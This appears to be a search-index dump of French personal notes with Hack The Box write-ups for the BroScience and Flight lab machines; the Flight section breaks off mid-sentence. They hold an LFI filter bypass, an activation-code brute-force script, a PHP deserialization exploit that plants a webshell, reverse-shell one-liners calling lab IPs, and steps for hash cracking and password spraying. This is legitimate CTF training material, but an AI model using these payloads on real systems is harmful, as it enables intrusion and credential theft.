{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Bienvenu sur rebsecnotes","text":"<p>Bienvenue,</p> <p>Ce site repr\u00e9sente mes notes personnelles, li\u00e9es \u00e0 la s\u00e9curit\u00e9 offensive.</p> <p>Vous y trouverez des notes concernant des outils, des m\u00e9thodologie (\u00e9num\u00e9ration / attaques, etc) et \u00e9galement des write-ups sur certaines boxes.</p>"},{"location":"CTF%20-%20Challenges/htb/BroScience/","title":"BroScience","text":""},{"location":"CTF%20-%20Challenges/htb/BroScience/#enumeration","title":"Enum\u00e9ration","text":"<p>Ports TCP ouverts</p> <pre><code>22/tcp  open  ssh                                                                                                                                                                                                                          \n80/tcp  open  http                                                                                                                                                                                                                         \n443/tcp open  https      \n</code></pre>"},{"location":"CTF%20-%20Challenges/htb/BroScience/#service-web","title":"Service WEB","text":""},{"location":"CTF%20-%20Challenges/htb/BroScience/#port-80","title":"Port 80","text":"<p>La bani\u00e8re du serveur retourne : <code>Apache/2.4.54 (Debian) Server at broscience.htb Port 80</code></p> <p>Toutes les pages du serveur semblent \u00eatre redirig\u00e9es vers la m\u00eame URL sur le port 443 (HTTPS)</p> <pre><code>feroxbuster -w \"/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\" -t 50  --auto-tune -u http://$TARGET_VHOST/ -s '200,204,302,307,308,401,403,405,404' --dont-filter \n</code></pre> <p>Seul certaines url mal form\u00e9es ne semble pas d\u00e9clencher la redirection :</p> <pre><code>http://broscience.htb/http%3A%2F%2Fyoutube\n</code></pre> <p>Mais cela ne semble a premi\u00e8re vue pas exploitable</p>"},{"location":"CTF%20-%20Challenges/htb/BroScience/#port-443","title":"Port 443","text":"<p>La bani\u00e8re du serveur retourne : <code>Apache/2.4.54 (Debian) Server at broscience.htb Port 443</code></p>"},{"location":"CTF%20-%20Challenges/htb/BroScience/#dossiers-interessants","title":"Dossiers int\u00e9ressants","text":"<pre><code>feroxbuster -w \"/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\" -t 50  --auto-tune -u https://$TARGET_VHOST/ --filter-status 301,404 -k --add-slash --no-recursion \n</code></pre> <p>Parmis les dossiers \u00e9num\u00e9r\u00e9s, le dossier <code>includes</code> contient des fichiers int\u00e9resant. Il ne sont toutefois pas visualisables mais nous chercherons \u00e0 les lire par la suite.</p> <p></p> <p>On d\u00e9couvre que le dossier <code>images</code> contient l'ensemble des images du site</p> <p></p> <p>La documentation d'apache 2.4 est \u00e9galement h\u00e9berg\u00e9e localement mais ne pr\u00e9sente aucun int\u00e9r\u00eat :</p> <p>https://broscience.htb/manual/</p> <p></p>"},{"location":"CTF%20-%20Challenges/htb/BroScience/#decouverte-manuelle-du-site","title":"D\u00e9couverte manuelle du site","text":""},{"location":"CTF%20-%20Challenges/htb/BroScience/#fichier-includesimgphp","title":"Fichier /includes/img.php","text":"<p>LFI potentielle via le param\u00e8tre path :</p> <ul> <li>Param\u00e8tre l\u00e9gitime :<code>/includes/img.php?path=deadlift.png</code></li> <li>Protection pr\u00e9sente retournant :</li> </ul> <p>```HTTP/1.1 200 OK Date: Wed, 15 Feb 2023 22:12:48 GMT Server: Apache/2.4.54 (Debian) Content-Length: 30 Connection: close Content-Type: text/html; charset=UTF-8</p> <p>Error: Attack detected.</p> <pre><code>- Motifs d\u00e9clenchants ce blocage :\n    - `../`\n    - `/etc/passwd`\n- Tentatives de contournement infructueuses :\n    - `..%5c`\n    - null byte\n    - RFI\n    - `' and die(system(\"curl http://10.10.14.147\")) or '`\n    - et autre suggestions provenant de &lt;https://book.hacktricks.xyz/pentesting-web/file-inclusion&gt;\n</code></pre>"},{"location":"CTF%20-%20Challenges/htb/BroScience/#decouverte-du-compte-utilisateur-bill-disposant-dun-shell-sur-le-systeme","title":"d\u00e9couverte du compte utilisateur 'bill' disposant d'un shell sur le syst\u00e8me","text":"<p>curl -k https://broscience.htb/includes/img.php?path=%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc%252fpasswd HTTP/1.1</p> <p>bill:x:1000:1000:bill,,,:/home/bill:/bin/bash</p>"},{"location":"CTF%20-%20Challenges/htb/BroScience/#decouverte-didentifiants","title":"d\u00e9couverte d'identifiants :","text":"<p>\u2514\u2500$ curl -k https://broscience.htb/includes/img.php?path=%252e%252e/includes/db_connect.php &lt;?php $db_host = \"localhost\"; $db_port = \"5432\"; $db_name = \"broscience\"; $db_user = \"dbuser\"; $db_pass = \"RangeOfMotion%777\"; $db_salt = \"NaCl\";</p> <pre><code># D\u00e9couverte du code source de l'application\n\nOn \u00e9num\u00e8re ensuite les quelques fichiers constituant le code source de l'application :\n\n![BroScience-9](../../BroScience-9.png)\n\n## Enum\u00e9ration des vuln\u00e9rabilit\u00e9s\n\nEn analysant le code de l'application, nous d\u00e9couvrons rapidement  plusieures vuln\u00e9rabilit\u00e9s :\n\n- Vuln\u00e9rabilit\u00e9 1 : Mauvaise initialisation du g\u00e9n\u00e9rateur de nombres al\u00e9atoires responsables de la g\u00e9n\u00e9ration du code d'activation rendant possible la d\u00e9couverte du code d'activation\n- Vuln\u00e9rabilit\u00e9 2 : Absence de protection concernant la d\u00e9s\u00e9rialisation d'un cookie utilisateur rendant possible l'ex\u00e9cution de code arbitraire \u00e0 distance.\nLa vuln\u00e9rabilit\u00e9 2 n'\u00e9tant exploitable que dans la zone authentifi\u00e9e du site, il faudra d'abord exploiter la vuln\u00e9rabilit\u00e9 1 pour obtenir une ex\u00e9cution de code arbitraire \u00e0 distance.\n\n## Exploitation\n### Vuln\u00e9rabilit\u00e9 1 : Activation d'un compte de test\n\n#### Analyse de la vuln\u00e9rabilit\u00e9\n\nLa fonction responsable de la g\u00e9n\u00e9ration du code d'activation lors de la cr\u00e9ation d'un compte utilisateur est la suivante :\n\n```php\nfunction generate_activation_code() {\n    $chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\";\n    srand(time());\n    $activation_code = \"\";\n    for ($i = 0; $i &lt; 32; $i++) {\n        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];\n    }\n    return $activation_code;\n}\n</code></pre> <p>Elle utilise la fonction <code>time()</code> pour initialiser le g\u00e9n\u00e9rateur de nombres al\u00e9atoires.</p> <p>Cela signifit qu'en sachant \u00e0 quelle heure a eu lieu la cr\u00e9ation du compte utilisateur, on peut deviner le code d'activation g\u00e9n\u00e9r\u00e9. La cons\u00e9quence directe \u00e9tant l'activation du compte sans poss\u00e9der le code d'activation.</p> <p>Etant donn\u00e9 que le serveur \u00e0 exploiter et notre machine ne sont pas synchronis\u00e9s niveau temps, on devra bruteforcer quelques codes d'activation avant et apr\u00e8s celui correspondant \u00e0 l'heure d'activation.</p>"},{"location":"CTF%20-%20Challenges/htb/BroScience/#attaque-du-code-dactivation","title":"Attaque du code d'activation","text":"<pre><code>&lt;?php\n\u00a0 \u00a0 /*\n\u00a0 \u00a0 \u00a0 \u00a0 File \u00a0: guess_activation_code.php\n\u00a0 \u00a0 \u00a0 \u00a0 Usage : \n    \u00a0 \u00a0 \u00a0 \u00a0 - Edit variables $user / $pass / $mail as desired\n            - php guess_activation_code.php | ffuf -u https://broscience.htb/activate.php?code=FUZZ -w - -fr \"Invalid\"\n\u00a0 \u00a0 */\n\u00a0 \u00a0 $user = \"reb\";\n\u00a0 \u00a0 $pass = $user;\n\u00a0 \u00a0 $mail = $user . \"@somewhere.org\";\n\u00a0 \u00a0 function generate_activation_code($time) {\n\u00a0 \u00a0 \u00a0 \u00a0 $chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\";\n\u00a0 \u00a0 \u00a0 \u00a0 srand($time);\n\u00a0 \u00a0 \u00a0 \u00a0 $activation_code = \"\";\n\u00a0 \u00a0 \u00a0 \u00a0 for ($i = 0; $i &lt; 32; $i++) {\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];\n\u00a0 \u00a0 \u00a0 \u00a0 }\n\u00a0 \u00a0 \u00a0 \u00a0 return $activation_code;\n\u00a0 \u00a0 }\n\u00a0 \u00a0 function print_brute_force_acivation_code($start_time, $end_time){\n\u00a0 \u00a0 \u00a0 \u00a0 for ($cur_time = $start_time ; $cur_time &lt;= $end_time ; $cur_time++){\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 $activation_code = generate_activation_code($cur_time);\n\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 echo $activation_code . \"\\n\";\n\u00a0 \u00a0 \u00a0 \u00a0 }\n\u00a0 \u00a0 }\n\n\u00a0 \u00a0 function register(){\n\u00a0 \u00a0 \u00a0 \u00a0 global $user, $pass, $mail;\n\u00a0 \u00a0 \u00a0 \u00a0 print \"[+] Registering...\";\n\u00a0 \u00a0 \u00a0 \u00a0 shell_exec(\"curl -v -k -X POST https://broscience.htb/register.php -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=$user&amp;email=$mail&amp;password=$pass&amp;password-confirm=$pass' &gt;&gt; register_log\" ) ;\n\u00a0 \u00a0 \u00a0 \u00a0 print \" \u00a0 \u00a0Done\";\n\u00a0 \u00a0 }\n\n\u00a0 \u00a0 function main(){\n\u00a0 \u00a0 \u00a0 \u00a0 $start_time = time();\n\u00a0 \u00a0 \u00a0 \u00a0 register();\n\u00a0 \u00a0 \u00a0 \u00a0 $end_time = time();\n\u00a0 \u00a0 \u00a0 \u00a0 print_brute_force_acivation_code($start_time-100, $end_time+100);\n\u00a0 \u00a0 }\n\u00a0 \u00a0 main();\n?&gt;\n</code></pre> <p>Au bout de quelques secondes, le compte utilisateur nouvellement cr\u00e9\u00e9 par le script ci-dessus sera activ\u00e9 \u00e0 l'aide de l'utilitaire <code>ffuf</code></p>"},{"location":"CTF%20-%20Challenges/htb/BroScience/#vulnerabilite-2-execution-de-code-a-distance","title":"Vuln\u00e9rabilit\u00e9 2 : Ex\u00e9cution de code \u00e0 distance","text":""},{"location":"CTF%20-%20Challenges/htb/BroScience/#analyse-de-la-vulnerabilite","title":"Analyse de la vuln\u00e9rabilit\u00e9","text":""},{"location":"CTF%20-%20Challenges/htb/BroScience/#absence-de-verification-dans-la-deserialisation-dun-objet-php-contenu-dans-un-cookie-utilisateur","title":"Absence de v\u00e9rification dans la d\u00e9serialisation d'un objet PHP contenu dans un cookie utilisateur","text":"<p>La partie authentifi\u00e9e du site propose un syst\u00e8me de th\u00e8me. Le th\u00e8me devant \u00eatre affich\u00e9 est param\u00e9tr\u00e9 \u00e0 l'aide d'un cookie utilisateur. Ce cookie contient une version s\u00e9rializ\u00e9e d'un objet PHP indiquant le th\u00e8me \u00e0 utiliser pour le rendu de la page.</p> <p>Lorsqu'une page est affich\u00e9e dans la section authentifi\u00e9e du site, le cookie est d\u00e9s\u00e9rialis\u00e9 sans aucun m\u00e9canisme de v\u00e9rification dans la fonction <code>get_theme()</code>  du fichier <code>/includes/utils.php</code>:</p> <pre><code>function get_theme() {\n    if (isset($_SESSION['id'])) {\n        if (!isset($_COOKIE['user-prefs'])) {\n            $up_cookie = base64_encode(serialize(new UserPrefs()));\n            setcookie('user-prefs', $up_cookie);\n        } else {\n            $up_cookie = $_COOKIE['user-prefs'];\n        }\n        $up = unserialize(base64_decode($up_cookie));\n        return $up-&gt;theme;\n    } else {\n        return \"light\";\n    }\n}\n</code></pre>"},{"location":"CTF%20-%20Challenges/htb/BroScience/#classes-utilisables-pour-realiser-une-inclusion-de-fichier-a-distance-rfi","title":"Classes utilisables pour r\u00e9aliser une inclusion de fichier \u00e0 distance (RFI)","text":"<p>La pr\u00e9sence dans le code php des 2 classes suivantes rendent possible la cr\u00e9ation d'un fichier contenant du code php menant \u00e0 une ex\u00e9cution de code arbitraire \u00e0 distance</p> <pre><code>class Avatar {\n    public $imgPath;\n\n    public function __construct($imgPath) {\n        $this-&gt;imgPath = $imgPath;\n    }\n\n    public function save($tmp) {\n        $f = fopen($this-&gt;imgPath, \"w\");    // &lt;==== propri\u00e9t\u00e9 'imgPath' controllable\n        fwrite($f, file_get_contents($tmp)); // &lt;==== propri\u00e9t\u00e9 'tmp' controllable\n        fclose($f);\n    }\n}\n\nclass AvatarInterface {\n    public $tmp;\n    public $imgPath; \n\n    public function __wakeup() {\n        $a = new Avatar($this-&gt;imgPath);\n        $a-&gt;save($this-&gt;tmp);\n    }\n}\n</code></pre>"},{"location":"CTF%20-%20Challenges/htb/BroScience/#exploitation","title":"Exploitation","text":"<p>On cr\u00e9e puis ex\u00e9cute ce script qui g\u00e9n\u00e9rera un cookie valide qui une fois d\u00e9s\u00e9rialis\u00e9, cr\u00e9era le fichier <code>$payload_path</code> qui contiendra <code>$payload</code> :</p> <pre><code>&lt;?php\n    // code vuln\u00e9rable unserialize(base64_decode($up_cookie));\n\n    // Attaque : cr\u00e9er un cookie valide qui une fois d\u00e9serialis\u00e9 pourra stocker un webshell dans un dossier de notre choix\n    // classes vuln\u00e9rables utilis\u00e9es :\n    class Avatar {\n        public $imgPath;\n\n        public function __construct($imgPath) {\n            $this-&gt;imgPath = $imgPath;\n        }\n\n        public function save($tmp) {\n            $f = fopen($this-&gt;imgPath, \"w\");\n            fwrite($f, file_get_contents($tmp));\n            fclose($f);\n        }\n    }\n    class AvatarInterface {\n        public $tmp;\n        public $imgPath; \n\n        public function __wakeup() {\n            $a = new Avatar($this-&gt;imgPath);\n            $a-&gt;save($this-&gt;tmp);\n        }\n    }\n\n    function println(string $x): void {\n        echo $x, PHP_EOL;\n    }\n\n    // cr\u00e9ation de l'objet \u00e0 serializer\n    $payload_path = \"/var/www/html/rebrec2.php\";\n    $rfi = 'http://10.10.24.179/rebrec-rs.php';  \n\n    $payload = '&lt;?php system($_GET[\"cmd\"]);';\n    $b64_payload = base64_encode($payload);\n    $rfi = 'php://filter/convert.base64-decode/resource=data://text/plain,' . $b64_payload;\n\n\n    $obj = new AvatarInterface();\n    $obj-&gt;tmp = $rfi;\n    $obj-&gt;imgPath = $payload_path;\n\n    $up_cookie = base64_encode(serialize($obj));\n    println('Cookie \u00e0 \"prefs\" \u00e0 mettre dans un une requ\u00eate GET /index.php apr\u00e8s avoir \u00e9t\u00e9 authentifi\u00e9 :');\n    println($up_cookie);\n    println('');\n    unserialize(base64_decode($up_cookie));\n    println(file_get_contents($payload_path));\n\n?&gt;\n</code></pre> <p>On ins\u00e8re ensuite ce cookie dans une requ\u00eate intercept\u00e9e \u00e0 l'aide de Burp :</p> <p></p>"},{"location":"CTF%20-%20Challenges/htb/BroScience/#obtention-dun-shell","title":"Obtention d'un shell","text":"<p>Pour une raison non ma\u00eetris\u00e9e, les reverse shell PHP ne semblaient pas fonctionner correctement, c'est pourquoi le code pr\u00e9sent\u00e9 ci-dessus n'est un \"Webshell\" tr\u00e8s basique.</p> <p>On l'utilise pour obtenir un reverse shell de la mani\u00e8re suivante :</p> <ul> <li>On cr\u00e9e un script <code>revshell.sh</code> qui contiendra notre reverse shell \u00e0 ex\u00e9cuter :</li> </ul> <pre><code>$ cat revshell.sh                                                \n#!env sh\n/bin/sh -i &gt;&amp; /dev/tcp/10.10.14.179/1337 0&gt;&amp;1\n</code></pre> <ul> <li>On le rend t\u00e9l\u00e9chargeable en lancant un serveur web depuis le dossier contenant ce script \u00e0 l'aide de la commande <code>python -m http.server 80</code></li> <li>On le t\u00e9l\u00e9charge via le webshell dans le dossier courant qui dispose d'un droit en \u00e9criture pour www-data :</li> </ul> <pre><code>curl -X GET http://broscience.htb/rebrec2.php?cmd=wget%20http://10.10.14.179/revshell.sh \n</code></pre> <ul> <li>On l'ex\u00e9cute apr\u00e8s avoir lanc\u00e9 localement un listener \u00e0 l'aide de la commande <code>rlwrap nc -lnvp 1337</code> :</li> </ul> <pre><code>curl -X GET http://broscience.htb/rebrec2.php?cmd=bash%20./revshell.sh \n</code></pre> <pre><code>id                                                                                                        \nuid=33(www-data) gid=33(www-data) groups=33(www-data)   \n</code></pre>"},{"location":"CTF%20-%20Challenges/htb/BroScience/#elevation-de-privileges","title":"Elevation de privil\u00e8ges","text":""},{"location":"CTF%20-%20Challenges/htb/BroScience/#_1","title":"BroScience","text":""},{"location":"CTF%20-%20Challenges/htb/BroScience/#ancienne-resolution-erronnee","title":"ANCIENNE RESOLUTION ERRONNEE","text":""},{"location":"CTF%20-%20Challenges/htb/BroScience/#_2","title":"BroScience","text":"<p>Apr\u00e8s avoir t\u00e9l\u00e9charg\u00e9 le script <code>lse.sh</code> puis l'avoir ex\u00e9cut\u00e9 avec la commande : <code>bash ./lse.sh -l1 p1</code>, on d\u00e9couvre que le shell <code>bash</code> est setuid root :</p> <pre><code>[!] fst020 Uncommon setuid binaries........................................ yes!                                      \n---                                                                                                                   \n/usr/bin/vmware-user-suid-wrapper                                                                                     \n/usr/bin/bash                                                                               \n</code></pre> <p>Il ne reste plus qu'\u00e0 obtenir les privil\u00e8ges root et afficher les flags :</p> <pre><code>$ bash -p                                                                                                             \nid                                                                                                                    \nuid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)                                                    \ncat /root/root.txt                                                                                                    \n7eaf6db3********37bd4f15830e0                                                                                      \ncat /home/bill/user.txt                                                                                               \n0d8eadfb********617b5debcecbfe54                      \n</code></pre>"},{"location":"CTF%20-%20Challenges/htb/BroScience/#_3","title":"BroScience","text":""},{"location":"CTF%20-%20Challenges/htb/BroScience/#nouvelle-resolution-privesc","title":"NOUVELLE RESOLUTION PRIVESC","text":""},{"location":"CTF%20-%20Challenges/htb/BroScience/#_4","title":"BroScience","text":"<p>On cherche dans la base de donn\u00e9e si elle ne contient pas des informations int\u00e9ressantes.</p> <p>Les identifiants de connexions \u00e9taient stock\u00e9s dans le fichier <code>include/db_connect.php</code>.</p> <p>On utilise donc la commande suivante :</p> <pre><code>psql -h localhost -U dbuser -d broscience \n</code></pre> <p>On liste les tables disponibles avec</p> <pre><code>\\dt\n</code></pre> <p>Puis on liste les enregistrements de la table <code>users</code> :</p> <pre><code>select * from users;\n id |   username    |             password             |            email             |         activation_code          | is_activated | is_admin |         date_created          \n----+---------------+----------------------------------+------------------------------+----------------------------------+--------------+----------+-------------------------------\n  1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | t            | t        | 2019-03-07 02:02:22.226763-05\n  2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb          | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | t            | f        | 2019-05-07 03:34:44.127644-04\n  3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb       | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | t            | f        | 2020-10-01 04:12:34.732872-04\n  4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb          | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | t            | f        | 2021-09-21 11:45:53.118482-04\n  5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb        | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm | t            | f        | 2021-08-13 10:34:36.226763-04\n  6 | aze1          | 5cd6546fa55766a2210b9bb796127a2e | aze1@aze.fr                  | GqrsXMa5DfoEPGmy7MvyjZSF5yJmCUIU | t            | f        | 2023-04-06 15:49:55.735886-04\n</code></pre> <p>On enregistre ce contenu dans le fichier <code>raw</code></p> <p>La g\u00e9n\u00e9ration du mot de passe est d\u00e9taill\u00e9e dans les fichiers suivants :</p> <ul> <li>db_connect.php : on y trouve la valeur du salt : <code>$db_salt = \"NaCl\"</code>.</li> <li>register.php : on y trouve que le mot de passe stock\u00e9 en base est un hash MD5 de la concat\u00e9nation du Salt et du mot de passe.</li> </ul> <p>On formatte donc le fichier raw pour qu'il soit interprettable par john :</p> <pre><code>$ awk -F '|' '{print $2\":\"$3\"$NaCl\"}' raw | sed 's/ //g' | tee hashes\nadministrator:15657792073e8a843d4f91fc403454e1$NaCl\nbill:13edad4932da9dbb57d9cd15b66ed104$NaCl\nmichael:bd3dad50e2d578ecba87d5fa15ca5f85$NaCl\njohn:a7eed23a7be6fe0d765197b1027453fe$NaCl\ndmytro:5d15340bded5b9395d5d14b9c21bc82b$NaCl\naze1:5cd6546fa55766a2210b9bb796127a2e$NaCl\n</code></pre> <p>On crack enfin nos hashes en pr\u00e9cisant le format de g\u00e9n\u00e9ration des hashes :</p> <pre><code>$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=dynamic='md5($s.$p)' hashes \nUsing default input encoding: UTF-8\nLoaded 6 password hashes with no different salts (dynamic=md5($s.$p) [256/256 AVX2 8x3])\nWarning: no OpenMP support for this hash type, consider --fork=4\nPress 'q' or Ctrl-C to abort, almost any other key for status\niluvhorsesandgym (bill)     \nAaronthehottest  (dmytro)     \n2applesplus2apples (michael)     \n</code></pre> <p>On se connecte ensuite en tant que \"bill\" via SSH et on r\u00e9cup\u00e8re le Flag utilisateur.</p> <p>Privesc</p> <p>On d\u00e9couvre le script <code>/opt/renew_cert.sh</code> qui est vuln\u00e9rable \u00e0 une injection de commande bash.</p> <p>A premi\u00e8re vue, ce script n'est pas ex\u00e9cut\u00e9 dans cron ou tout du moins, pas depuis un emplacement sur lequel nous avons des droits de lecture.</p> <p>On v\u00e9rifie s'il est appel\u00e9 autrement via l'outil <code>pspy</code>.</p> <p>Au bout d'une minute, on d\u00e9couvre qu'il est effectivement appel\u00e9 par l'utilisateur root avec en param\u00e8tre un certificat situ\u00e9 dans <code>/home/bill/Certs/broscience.crt</code></p> <p>Apr\u00e8s analyse du script vuln\u00e9rable on d\u00e9termine les \u00e9l\u00e9ments permettant de d\u00e9clencher une ex\u00e9cution de code arbitraire :</p> <ul> <li>il faut un certificat expirant dans moins de 24h</li> <li>il faut que le <code>Common Name</code> contienne l'injection de commande.</li> </ul> <p>Apr\u00e8s quelques test, facilit\u00e9s via le lancement du script \u00e0 l'aide de <code>bash -x</code>, on on arrive \u00e0 cr\u00e9er une payload fonctionnelle.</p> <p><code>$(bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.34/1338 0&gt;&amp;1'</code></p>"},{"location":"CTF%20-%20Challenges/htb/Flight/","title":"Flight","text":""},{"location":"CTF%20-%20Challenges/htb/Flight/#decouverte-des-services-exposes","title":"D\u00e9couverte des services expos\u00e9s","text":"<p>Nous sommes face \u00e0 ce qui ressemble \u00e0 un controlleur de domaine Active Directory ex\u00e9cutant un service Web sur le port 80</p> <pre><code>$ sudo nmap -sS -Pn -T5 -oA nmap $TARGET_IP\n53/tcp   open  domain\n80/tcp   open  http\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n</code></pre>"},{"location":"CTF%20-%20Challenges/htb/Flight/#partages","title":"Partages","text":"<p>L'authentification nulle nous permet de r\u00e9cup\u00e9rer le nom DNS.</p> <pre><code>$ cme smb $TARGET_IP -u \"\" -p \"\" | cut -c60-\n      [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)\n      [+] flight.htb\\: \n</code></pre>"},{"location":"CTF%20-%20Challenges/htb/Flight/#site-web-port-80","title":"Site Web (port 80)","text":"<p>Nous sommes face \u00e0 un site web ne disposant que de fonctionnalit\u00e9s statiques</p> <p></p> <p>Les actions suivantes n'offrent aucun vecteur d'attaque :</p> <ul> <li>La recherche d'erreurs de configuration : <code>nikto -h http://$TARGET_VHOST</code></li> <li>La recherche de dossiers int\u00e9ressant : <code>gobuster dir -u http://$TARGET_VHOST:80/ -w \"/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\" -t 50 --add-slash</code></li> <li>La recherche d'enregistrements DNS <code>gobuster dns -d flight.htb -r $TARGET_IP -t 50 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</code></li> </ul>"},{"location":"CTF%20-%20Challenges/htb/Flight/#decouverte-du-nom-de-domaine-schoolflighthtb","title":"D\u00e9couverte du nom de domaine school.flight.htb","text":"<p>On d\u00e9couvre un second site \u00e0 l'adresse http://school.flight.htb en menant une attaque par dictionnaire sur les sous domaines de <code>flight.htb</code> :</p> <pre><code>\u2514\u2500$ gobuster vhost --append-domain flight.htb --url flight.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \n===============================================================\nGobuster v3.4\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:             http://flight.htb\n[+] Method:          GET\n[+] Threads:         10\n[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n[+] User Agent:      gobuster/3.4\n[+] Timeout:         10s\n[+] Append Domain:   true\n===============================================================\n2023/03/08 04:25:23 Starting gobuster in VHOST enumeration mode\n===============================================================\nFound: school.flight.htb Status: 200 [Size: 3996]\nProgress: 4910 / 4990 (98.40%)\n===============================================================\n2023/03/08 04:25:38 Finished\n===============================================================\n</code></pre>"},{"location":"CTF%20-%20Challenges/htb/Flight/#presence-dune-lfi-sur-la-page-daccueil","title":"Pr\u00e9sence d'une LFI sur la page d'accueil","text":"<p>En cliquant sur le lien <code>Home</code> on d\u00e9couvre que le fichier <code>index.php</code> affiche des pages via le  param\u00e8tre <code>view</code>. Apr\u00e8s v\u00e9rification il est vuln\u00e9rable \u00e0 une LFI nous permettant de r\u00e9cup\u00e9rer le hash du compte de service utilis\u00e9 par le serveur web.</p>"},{"location":"CTF%20-%20Challenges/htb/Flight/#exploitation-de-la-lfi","title":"Exploitation de la LFI","text":"<p>On lance un responder avec la commande <code>responder -i tun0</code> et on tente d'inclure un chemin UNC dans notre requ\u00eate :</p> <p></p> <p>On observe la capture du hash du compte <code>svc_apache</code> dans <code>responder</code></p> <p></p> <p>Le hash r\u00e9cup\u00e9r\u00e9 est cass\u00e9 rapidement \u00e0 l'aide de <code>john</code> et nous offre un premier compte :</p> Utilisateur Mot de passe <code>flight.htb\\svc_apache</code> <code>S@Ss!K@*t13</code>"},{"location":"CTF%20-%20Challenges/htb/Flight/#enumeration-des-autorisations-de-svc_apache","title":"Enum\u00e9ration des autorisations de svc_apache","text":"<p>L'utilisateur dispose de droits en lecture sur un certain nombre de partages :</p> <pre><code>\u2514\u2500$ cme smb $TARGET_IP -u \"$AD_USER\" -p \"$AD_PASSWORD\" -d \"$AD_DOMAIN\" --shares | cut -c60- \n/usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: \"is not\" with a literal. Did you mean \"!=\"?\n  if result['type'] is not 'searchResEntry':\n      [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)\n      [+] flight.htb\\svc_apache:S@Ss!K@*t13 \n      [+] Enumerated shares\n      Share           Permissions     Remark\n      -----           -----------     ------\n      ADMIN$                          Remote Admin\n      C$                              Default share\n      IPC$            READ            Remote IPC\n      NETLOGON        READ            Logon server share \n      Shared          READ            \n      SYSVOL          READ            Logon server share \n      Users           READ            \n      Web             READ            \n</code></pre> <p>Cela ne nous offre n\u00e9anmoins pas de possibilit\u00e9 d'\u00e9lever nos privil\u00e8ges.</p>"},{"location":"CTF%20-%20Challenges/htb/Flight/#reutilisation-du-mot-de-passe-sur-dautres-comptes","title":"R\u00e9utilisation du mot de passe sur d'autres comptes","text":"<p>Gra\u00e2ce \u00e0 ce compte, nous pouvons tout de m\u00eame \u00e9num\u00e9rer la liste des comptes utilisateurs de l'annuaire Active Directory et v\u00e9rifier si le mot de passe en notre possession n'est pas utilis\u00e9 par un autre compte.</p> <p>Nous d\u00e9couvrons que l'utilisateur <code>s.moon</code> utilise le m\u00eame mot de passe que le compte <code>svc_apache</code> :</p> <pre><code># Creation d'une liste d'utilisateur a attaquer\ncme smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --users | tr -s ' ' | tail -n +4 | cut -d ' ' -f 5 | cut -d '\\' -f 2 | tee users.txt\n\n# Password spraying sur cette liste d'utilisateurs\ncme smb $TARGET_IP -u users.txt -p $AD_PASSWORD --continue-on-success\n</code></pre> <p>Nous obtenons ainsi l'acc\u00e8s \u00e0 un nouveau compte :</p> Utilisateur Mot de passe <code>flight.htb\\S.Moon</code> <code>S@Ss!K@*t13</code>"},{"location":"CTF%20-%20Challenges/htb/Flight/#enumeration-des-autorisations-de-smoon","title":"Enum\u00e9ration des autorisations de S.Moon","text":"<p>Cet utilisateur poss\u00e8de un droit d'\u00e9criture sur le dossier <code>Shared</code> :</p> <pre><code># Pr\u00e9sence d'un droit d'\u00e9criture sur le partage Shared\n$ cme smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --shares | cut -c60-\n      Shared          READ,WRITE      \n</code></pre> <p>Ce dossier est vide et ne semble pas accepter la cr\u00e9ation de nouveau fichiers.</p> <p>On constate que l'on peut cr\u00e9er des dossiers, mais la cr\u00e9ation de fichiers ne semble pas fonctionner.</p> <p>Apr\u00e8s un temps de recherche important, on d\u00e9couvre que cette partie du challenge est finalement totalement ir\u00e9aliste (mais cela fait partie du jeu dans les CTF : en effet, la cr\u00e9ation de fichiers <code>.ini</code> est autoris\u00e9e. (A quoi cela servirait dans la vrai vie, encore plus sur un partage nomm\u00e9 <code>Shared</code> ?).</p> <p>Une fois cette d\u00e9couverte r\u00e9alis\u00e9e en se dirige vers les techniques classiques de vole de hash tr\u00e8s bien 